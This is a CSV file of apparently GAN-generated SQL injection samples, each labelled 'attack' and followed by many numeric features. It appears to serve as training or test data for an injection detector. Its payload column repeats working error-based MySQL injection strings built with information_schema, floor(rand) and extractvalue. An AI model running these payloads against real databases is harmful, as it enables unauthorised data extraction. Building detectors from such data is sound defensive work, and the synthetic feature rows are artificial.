id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.858146165187044,289.0971984863281,87.72882843017578,41.853675842285156,111.87998962402344,4.6544623374938965,85.85212707519531,39.855342864990234,0.9587335586547852,0.3218741714954376,0.14352744817733765,0.39357683062553406,0.1312166005373001,3.8468587398529053,1.5372061729431152,0.7865080237388611,0.5769842267036438,0.12424018234014511,0.028362222015857697,-0.06131419166922569,10.137941360473633,11.536676406860352,3.169360876083374,0.17923244833946228,2.003561019897461,0.1294059157371521,-0.005887982435524464,0.43756353855133057,0.14387935400009155,0.7616055607795715,0.12799061834812164,0.007139556109905243,1.661022424697876,-0.160018652677536,0.38183528184890747,2.1509101390838623,9.047972679138184,1.1419453620910645,2.2446844577789307,0.4103420078754425,0.2595061957836151,0.9736071228981018,0.0752781331539154,0.043456729501485825,-0.038897134363651276,0.0026818513870239258,0.04647555947303772,0.5081316828727722,0.5284281373023987,0.5224838256835938,0.4803414046764374,0.5198541879653931,0.08703568577766418,-0.0004229992628097534,0.4368411898612976,0.16131579875946045,0.2308528870344162,-0.03612145408987999,-0.19068381190299988,0.10118162631988525,0.04419683665037155,-0.16588261723518372,0.04160682111978531,-0.018043698742985725,0.20519202947616577,-0.11319001019001007,0.5634403228759766,-0.1362799108028412,-0.07732591778039932,0.0929349958896637,0.1075545996427536,-0.008947370573878288,-0.0318143330514431,-0.0022684335708618164,0.027331124991178513,0.012057017534971237,1.0369431972503662,0.5006298422813416,0.13889536261558533,0.13297507166862488,0.4778943657875061,10.278897285461426,0.665485680103302,0.1432061344385147,0.05506261810660362,0.683937668800354,0.0006992220878601074,-0.14331883192062378,-0.022978313267230988
GAN_000002,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.752809484071104,285.5736083984375,92.73111724853516,42.25297164916992,112.62435913085938,5.868696212768555,84.06664276123047,42.07387924194336,1.0186442136764526,0.30073609948158264,0.14679326117038727,0.3903094232082367,0.13355784118175507,3.798689126968384,2.0333409309387207,0.5546239614486694,0.7669520378112793,0.05362686142325401,0.07226983457803726,-0.07271958887577057,9.608345031738281,11.385190963745117,3.437493085861206,0.1309714913368225,1.8628360033035278,0.06332263350486755,-0.00966791994869709,0.5847284197807312,0.18004678189754486,0.7606878280639648,0.11606281995773315,0.06162639707326889,1.6572465896606445,0.24480919539928436,0.3976338505744934,2.1155970096588135,8.645513534545898,0.9395353198051453,1.8465054035186768,0.27756446599960327,0.2587415277957916,0.9459753036499023,0.058935489505529404,0.019575756043195724,-0.16622109711170197,0.2553884983062744,0.12446853518486023,0.4353654086589813,0.4071275293827057,0.4482502043247223,0.3294205069541931,0.6802802085876465,0.07221008837223053,-0.05904599651694298,0.45511695742607117,0.20602813363075256,0.2911953330039978,0.11280912160873413,-0.1301979422569275,0.07785733044147491,0.028182484209537506,0.06688514351844788,0.13971258699893951,0.033249616622924805,0.1638207584619522,-0.07256719470024109,0.6116044521331787,-0.2998637855052948,-0.18050320446491241,0.03711675852537155,0.04698425531387329,-0.23122507333755493,-0.23497213423252106,0.012563064694404602,-0.13020677864551544,0.057797715067863464,1.2025972604751587,0.4289698600769043,0.17565736174583435,0.030026521533727646,0.3987762928009033,10.047338485717773,0.7432581186294556,0.180010586977005,-0.0197839867323637,0.7292506098747253,-0.052776485681533813,0.16792231798171997,-0.054946061223745346
GAN_000003,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,5.921212740509005,286.62225341796875,87.89334869384766,42.13753128051758,113.31503295898438,1.9709476232528687,87.2255630493164,40.3399658203125,0.8662891387939453,0.31476807594299316,0.147874116897583,0.39415961503982544,0.1289186179637909,3.8421945571899414,1.5986031293869019,0.9229806661605835,0.601940393447876,0.1484169065952301,0.09706276655197144,-0.14002659916877747,10.405648231506348,11.88794231414795,2.946718692779541,0.10682573914527893,1.9630736112594604,0.17803139984607697,0.08431693911552429,0.4883786141872406,0.23118919134140015,0.785149335861206,0.25010210275650024,-0.05786123126745224,1.674296259880066,-0.20915883779525757,0.38960951566696167,2.2062578201293945,9.115446090698242,1.1791529655456543,2.2026920318603516,0.29450467228889465,0.2655772864818573,0.8969505429267883,-0.11077973991632462,0.057481732219457626,-0.05786922201514244,-0.023029126226902008,0.1906803548336029,0.4787129759788513,0.537420392036438,0.5924285650253296,0.49521175026893616,0.5403727889060974,0.23449760675430298,0.07932121306657791,0.40991711616516113,0.20130109786987305,0.2331438809633255,0.008034352213144302,-0.2452802062034607,0.08787171542644501,0.14956322312355042,-0.04518914222717285,0.08721961826086044,-0.01670065149664879,0.24546413123607635,-0.12841875851154327,0.6094596982002258,-0.034910641610622406,-0.1911957710981369,0.11232828348875046,0.026973579078912735,-0.03559286892414093,-0.07401049137115479,-0.12023094296455383,0.03058318793773651,-0.081402987241745,1.0696438550949097,0.5241662263870239,0.15710033476352692,0.11220624297857285,0.4643053710460663,10.01960563659668,0.7001228928565979,0.12224002182483673,0.05373053625226021,0.7210767269134521,0.07419453561306,-0.07905972003936768,0.07362833619117737
GAN_000004,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.865148786382311,290.5099182128906,88.58747100830078,42.3338737487793,111.76936340332031,6.87721061706543,87.4611587524414,40.19215393066406,0.9351732134819031,0.3199193775653839,0.14503487944602966,0.3892017602920532,0.13412292301654816,3.8709332942962646,1.692917823791504,0.561491072177887,0.5096232295036316,0.061978552490472794,0.09917821735143661,-0.050641581416130066,10.202969551086426,11.281278610229492,3.319284677505493,0.1518079936504364,2.0224874019622803,0.14355958998203278,0.02876698225736618,0.4566882848739624,0.16770201921463013,0.8995794057846069,0.15508471429347992,-0.09556052833795547,1.5522080659866333,-0.10833214223384857,0.3239453136920929,2.224031448364258,9.004837989807129,0.9902211427688599,2.0404486656188965,0.15445877611637115,0.3451351821422577,0.9671300053596497,-0.015662305057048798,0.025234045460820198,-0.1600821316242218,0.2133062481880188,0.005532063543796539,0.5161189436912537,0.5264493823051453,0.5500034093856812,0.5197134017944336,0.5791656970977783,-0.008563779294490814,0.05380914360284805,0.5108864903450012,0.18858757615089417,0.17359435558319092,0.029728684574365616,-0.02497488260269165,0.18420368432998657,0.06494701653718948,0.1411978304386139,0.083650603890419,0.014929212629795074,-0.03944900631904602,-0.062362514436244965,0.42868465185165405,-0.06828907132148743,-0.022245783358812332,0.08283988386392593,-0.1104615181684494,0.05753286927938461,0.026310738176107407,-0.023209646344184875,-0.060636550188064575,-0.12954938411712646,1.021335482597351,0.44096943736076355,0.17516270279884338,0.04941979795694351,0.4631269872188568,10.375093460083008,0.724891722202301,0.17512951791286469,0.05229766294360161,0.6458784341812134,-0.06980599462985992,0.12433099746704102,0.2001478523015976
GAN_000005,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.834430601261828,289.5310974121094,91.88058471679688,41.98583984375,111.39556884765625,4.622045993804932,85.95993041992188,40.30333709716797,0.9302071332931519,0.31962892413139343,0.14224189519882202,0.3876282870769501,0.12938910722732544,3.861010789871216,1.7443650960922241,0.6167580485343933,0.5883697271347046,0.027924319729208946,0.032013922929763794,-0.12617796659469604,10.55020523071289,11.325933456420898,3.2097744941711426,0.10036938637495041,1.8847922086715698,0.11059650778770447,0.06058147922158241,0.42394307255744934,0.14424587786197662,0.7440899610519409,0.15274456143379211,0.001027517020702362,1.5586063861846924,-0.08739475160837173,0.4059653580188751,2.130236864089966,8.958348274230957,1.0874521732330322,2.0952091217041016,0.25483623147010803,0.36303284764289856,0.9812408089637756,0.0029794275760650635,0.027872418984770775,-0.1362277716398239,0.13520954549312592,0.06528303027153015,0.45751437544822693,0.5378422737121582,0.5731347799301147,0.49258023500442505,0.5977170467376709,0.08152097463607788,-0.014896396547555923,0.49102407693862915,0.1658966988325119,0.192648783326149,-0.11111702024936676,-0.08568256348371506,0.2731775641441345,-0.027389951050281525,0.12201429903507233,0.1926606297492981,0.03119535744190216,0.1502603441476822,0.036286916583776474,0.5194897055625916,-0.047461286187171936,-0.11409085243940353,0.011459030210971832,-0.014234334230422974,-0.0017792098224163055,0.021846529096364975,-0.02276894450187683,-0.16387009620666504,-0.12730072438716888,0.9283703565597534,0.4560694694519043,0.146663099527359,0.053884901106357574,0.47610238194465637,9.864299774169922,0.7355537414550781,0.15284650027751923,0.060622960329055786,0.7312928438186646,0.06383603811264038,-0.009310256689786911,0.17800520360469818
GAN_000006,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.93555810140843,285.5703430175781,86.74703979492188,41.07501220703125,112.17202758789062,1.403408408164978,90.20420837402344,42.346561431884766,0.691378653049469,0.3137863576412201,0.15149328112602234,0.3895558714866638,0.13056553900241852,3.864938259124756,1.763426661491394,0.5795010328292847,0.4809802174568176,0.0847308412194252,0.07756293565034866,0.04286586493253708,10.096610069274902,11.455376625061035,3.1328976154327393,0.14788584411144257,1.8741201162338257,0.13283613324165344,-0.0527125783264637,0.4100668430328369,0.2238776981830597,0.7219861745834351,0.2539510130882263,-0.14295214414596558,1.6546791791915894,-0.09483524411916733,0.404521644115448,2.096327066421509,8.698816299438477,1.1677693128585815,2.1192679405212402,0.385170578956604,0.27952638268470764,0.9122291803359985,-0.07628282159566879,0.0502922385931015,-0.053958602249622345,0.1297726184129715,0.32669907808303833,0.46097537875175476,0.5323658585548401,0.6016055941581726,0.5122119784355164,0.5425758361816406,0.28335654735565186,-0.1416754424571991,0.38079971075057983,0.1902482956647873,0.17650887370109558,0.06969870626926422,-0.2587985694408417,0.19246894121170044,0.004470907151699066,-0.026576053351163864,0.1810949146747589,0.03161739557981491,0.1877755969762802,-0.04298938810825348,0.5126994848251343,0.061004169285297394,-0.19748741388320923,0.03554314374923706,0.0008803978562355042,-0.06575559079647064,0.014728199690580368,-0.129340261220932,-0.14417706429958344,-0.1365060657262802,1.0891444683074951,0.4485231339931488,0.16639447212219238,0.13119305670261383,0.4815136194229126,9.746552467346191,0.7653568983078003,0.14256805181503296,0.041153524070978165,0.7307406663894653,0.15096987783908844,-0.05474088340997696,0.0522448867559433
GAN_000007,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.848892058150629,290.5079650878906,92.09867095947266,41.15327453613281,110.25148010253906,6.615160942077637,86.63896942138672,40.314369201660156,1.1116453409194946,0.31561774015426636,0.1413211226463318,0.38776150345802307,0.13041925430297852,3.8382670879364014,1.6980206966400146,0.6181479692459106,0.5853875875473022,0.016387423500418663,-0.11851220577955246,-0.32943445444107056,10.705123901367188,11.172449111938477,3.0893642902374268,0.15424923598766327,1.8951612710952759,0.08535081893205643,0.05012386292219162,0.41689491271972656,0.06483020633459091,0.639125406742096,0.20889529585838318,0.08292446285486221,1.595700979232788,-0.1095651388168335,0.4070415496826172,2.0778324604034424,8.877252578735352,0.9638994932174683,2.0899171829223633,0.3908196985721588,0.3241306245326996,0.9672464728355408,-0.04212892800569534,0.02378322184085846,-0.03679201006889343,0.13831569254398346,0.009187377989292145,0.41499319672584534,0.4455329179763794,0.5833947062492371,0.4325287640094757,0.6459997892379761,0.11324983090162277,0.06255508214235306,0.528403103351593,0.13515014946460724,0.20775002241134644,-0.20196257531642914,-0.014955759048461914,0.28491947054862976,-0.007892869412899017,0.15540173649787903,0.21235188841819763,-0.028498003259301186,0.31740376353263855,0.13273555040359497,0.5587539076805115,-0.04143825173377991,-0.23438511788845062,-0.04213722050189972,-0.04004383087158203,0.02191280573606491,-0.07651861011981964,-0.12784701585769653,-0.022270631045103073,-0.039507005363702774,0.8247438073158264,0.4840702414512634,0.2414761781692505,0.049272481352090836,0.5169059038162231,9.863697052001953,0.7856982946395874,0.16374719142913818,0.047107044607400894,0.7875567674636841,0.03061850368976593,0.057585034519433975,0.12334057688713074
GAN_000008,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.81876852473569,288.124267578125,89.62840270996094,42.16450119018555,110.8094482421875,4.637915134429932,85.35090637207031,39.91438293457031,0.9741034507751465,0.32497432827949524,0.14401492476463318,0.391765296459198,0.13242381811141968,3.8399550914764404,1.606809377670288,0.6687054634094238,0.5898039937019348,0.08686576783657074,-0.021008267998695374,-0.134490966796875,10.2970609664917,11.247920989990234,3.130755662918091,0.13169793784618378,2.0175235271453857,0.11544279009103775,0.08221393823623657,0.4868168234825134,0.10069223493337631,0.7696735262870789,0.12870723009109497,0.012468338012695312,1.5150947570800781,-0.11260661482810974,0.3838941156864166,2.2339847087860107,9.02707290649414,1.0905977487564087,2.2489020824432373,0.35566380620002747,0.2989574670791626,0.9824430346488953,0.016338661313056946,0.03525839373469353,-0.059612710028886795,0.1446627676486969,-0.062461815774440765,0.47591671347618103,0.4712268114089966,0.5203649401664734,0.4730032980442047,0.578395664691925,-0.001692652702331543,0.06920570880174637,0.4983074963092804,0.15603485703468323,0.20353233814239502,-0.06324809789657593,-0.09118372201919556,0.18863239884376526,0.00784061849117279,-0.021552395075559616,0.0661974549293518,0.034800320863723755,0.1994694322347641,-0.0669039785861969,0.5764822959899902,-0.11372202634811401,-0.11794757843017578,0.004707112908363342,0.17415659129619598,0.0429307222366333,0.02081364206969738,0.020863287150859833,-0.012422052212059498,-0.03526749834418297,0.9720140695571899,0.500023365020752,0.15865656733512878,0.09425906836986542,0.47147423028945923,10.278848648071289,0.6852506399154663,0.15190339088439941,0.06209874898195267,0.6826034784317017,-0.057491715997457504,-0.03340579569339752,0.03968946635723114
GAN_000009,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.837949902197822,286.8082580566406,89.58977508544922,42.335445404052734,109.4745101928711,3.6062915325164795,83.84883117675781,39.83409118652344,0.9840702414512634,0.32687482237815857,0.1435728371143341,0.39310601353645325,0.12990878522396088,3.8377268314361572,1.6208314895629883,0.5951467752456665,0.5531828999519348,0.09411124885082245,-0.003211403265595436,-0.06447295099496841,10.636089324951172,11.314336776733398,3.2741446495056152,0.17411552369594574,1.9456582069396973,0.1130220890045166,0.08412264287471771,0.5248898267745972,0.12705343961715698,0.6681342124938965,0.1283971071243286,0.05281177908182144,1.5075640678405762,-0.17365075647830963,0.3935279846191406,2.2802743911743164,9.107277870178223,1.1290310621261597,2.330526351928711,0.3367857336997986,0.31455835700035095,0.9964435696601868,-0.01576036959886551,0.017728634178638458,-0.07189014554023743,0.07644467055797577,-0.026177413761615753,0.4793771505355835,0.44737496972084045,0.5038284063339233,0.470176100730896,0.5690402388572693,-0.0355430468916893,0.05374445021152496,0.5308980941772461,0.15386173129081726,0.20009827613830566,-0.012295227497816086,-0.10610785335302353,0.22029510140419006,0.048849232494831085,-0.0034834593534469604,0.012681201100349426,0.09006159752607346,0.27702391147613525,0.015398260205984116,0.5946292281150818,-0.1448197066783905,-0.17609772086143494,-0.011333487927913666,0.1979842633008957,-0.06086990237236023,-0.028411362320184708,-0.06438575685024261,-0.014822838827967644,0.0016456805169582367,0.9714731574058533,0.5313823819160461,0.18178537487983704,0.10304519534111023,0.4617307782173157,10.245439529418945,0.7046112418174744,0.16573850810527802,0.0540987066924572,0.686095118522644,-0.06259173154830933,-0.10122755169868469,0.04570682346820831
GAN_000010,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.971263645155,285.30169677734375,86.80752563476562,40.283878326416016,112.51874542236328,6.352357387542725,93.17526245117188,39.29153823852539,0.8302114605903625,0.31883424520492554,0.14480945467948914,0.39163362979888916,0.13196595013141632,3.8525683879852295,1.5144736766815186,0.6648148894309998,0.4088745713233948,0.06575614959001541,-0.06296795606613159,-0.2581478953361511,10.214568138122559,11.569286346435547,2.6554601192474365,0.28155508637428284,2.0247385501861572,0.12387244403362274,0.007721950300037861,0.39372748136520386,0.0997239425778389,0.6998550891876221,0.2367159128189087,0.03379226475954056,1.5201226472854614,-0.38298460841178894,0.3180712163448334,2.188389778137207,8.996423721313477,1.1394551992416382,2.1664483547210693,0.4158928394317627,0.23347201943397522,0.954008936882019,-0.18274331092834473,0.04422484710812569,0.02263527363538742,0.10544862598180771,0.026241853833198547,0.4692426323890686,0.4112081825733185,0.5712155103683472,0.4957098364830017,0.5777882933616638,0.011656679213047028,0.2259867787361145,0.569929301738739,0.14951938390731812,0.12096264213323593,-0.08198104798793793,-0.0009794607758522034,0.28346359729766846,0.1559094488620758,0.11490030586719513,0.024032987654209137,-0.09012392163276672,0.2397441267967224,-0.009441915899515152,0.43097904324531555,0.1608453392982483,-0.20098406076431274,0.04826348274946213,-0.008875690400600433,0.16709595918655396,0.026329562067985535,-0.12389779090881348,0.02713841199874878,-0.15189547836780548,0.9363878965377808,0.5245673060417175,0.3453276753425598,0.07834162563085556,0.4870074391365051,10.3565673828125,0.7606049180030823,0.14898261427879333,0.05261630192399025,0.648235023021698,-0.033246323466300964,0.099795863032341,0.24720658361911774
